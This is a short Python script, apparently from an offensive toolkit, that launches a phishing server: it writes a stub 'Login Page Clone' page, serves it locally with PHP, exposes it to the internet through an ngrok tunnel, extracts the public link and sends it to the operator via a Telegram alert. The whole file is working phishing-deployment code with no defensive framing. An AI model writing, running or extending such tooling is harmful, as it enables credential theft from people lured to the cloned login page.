import os
import time
from config.telegram import send_alert

def run():
    print("[*] Launching Phishing Server...")
    os.system("mkdir -p sites && cd sites && echo '<h1>Login Page Clone</h1>' > index.html")
    os.system("cd sites && php -S 127.0.0.1:8080 > /dev/null 2>&1 &")
    time.sleep(3)

    print("[*] Starting Ngrok...")
    os.system("./ngrok http 8080 > /dev/null &")
    time.sleep(5)

    try:
        url = os.popen("curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[0-9a-z]*\\.ngrok.io' | head -n1").read().strip()
        if url:
            print(f"[+] Phishing Link: {url}")
            send_alert(f"[PHISHING PAGE] {url}")
        else:
            print("[-] Failed to retrieve Ngrok URL.")
    except Exception as e:
        print("Error:", e)
